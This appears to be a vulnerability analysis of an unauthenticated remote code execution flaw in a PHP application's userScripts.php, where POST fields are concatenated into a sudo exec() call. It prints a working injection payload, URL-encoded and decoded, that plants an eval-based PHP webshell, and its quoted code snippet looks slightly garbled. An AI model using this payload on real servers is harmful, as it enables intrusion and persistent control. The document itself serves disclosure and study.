Based on the provided content, here's a breakdown of the vulnerability:

**Root cause of vulnerability:**

The vulnerability stems from the lack of proper sanitization of user-supplied input (`$_POST['folder']` and `$_POST['folderNew']`) in the `htdocs/userScripts.php` file. This input is directly used in the construction of a shell command that is then executed using the `exec()` function.

**Weaknesses/vulnerabilities present:**

-   **Remote Code Execution (RCE):** The primary vulnerability is RCE. Because user-controlled input is used to build a command that is then executed, an attacker can inject arbitrary shell commands.
-   **Lack of Input Sanitization:** The code fails to sanitize or validate the `$_POST['folder']` and `$_POST['folderNew']` variables before using them in the `exec()` function.
-   **Unrestricted Command Execution:** The `exec()` function allows the execution of arbitrary shell commands without any restrictions.

**Impact of exploitation:**

-   **Complete System Compromise:** A successful exploit can allow the attacker to execute arbitrary commands on the server, potentially leading to complete system compromise, data exfiltration, or denial of service.
-   **Webshell Creation:** The provided Proof of Concept (PoC) demonstrates how an attacker can create a webshell on the server, granting persistent access and control.

**Attack vectors:**

-   **HTTP POST Request:** The vulnerability is triggered by sending a crafted HTTP POST request to the `htdocs/userScripts.php` endpoint.
-   **Manipulated POST parameters:** The attacker controls `$_POST['folder']` and `$_POST['folderNew']` parameters.

**Required attacker capabilities/position:**

-   **Network Access:** The attacker needs network access to the server hosting the vulnerable application.
-   **No Authentication Required**: The attacker does not need any authentication to exploit the vulnerability.
-   **Knowledge of the Vulnerable Endpoint:** The attacker needs to know the path to the vulnerable script (`htdocs/userScripts.php`).

**Technical Details:**

The vulnerable code snippet is as follows:

```php
$post['filename'] = $_POST['filename'];  //Line 46 (Source)
if($_POST['ACTION'] == "userScript") {	// Line 62 (Check point)
    $messageAction.="Executed'sudo".$conf['scripts_abs']."/userscripts/".$post['folder']."".$post['folderNew']."'";    // Line 64 (Tainted)
    $exec="sudo".$conf['scripts_abs']."/userscripts/".$post['folder']."".$post['folderNew'];	// Line 67 (Tainted)
      exec($exec);	// Line 68(Sink)
}
```
The attacker leverages this vulnerability with the following HTTP POST request:

```
POST /htdocs/userScripts.php
Data:
ACTION=userScript&folder=hello+%3b+echo+%22%3c%3fphp+%40eval(%5c%24_POST%5b%27shell4%27%5d)+%3f%3e%22++%3e+.%2fshell4.php+%3b&folderNew=echo+%22hello%22
```

Which translates to:

```
ACTION=userScript&folder=hello ; echo "<?php @eval(\$_POST['shell4']) ?>" > ./shell4.php ;&folderNew=echo "hello"
```
This payload creates a webshell (`shell4.php`) that can be used to execute arbitrary php code on the server.
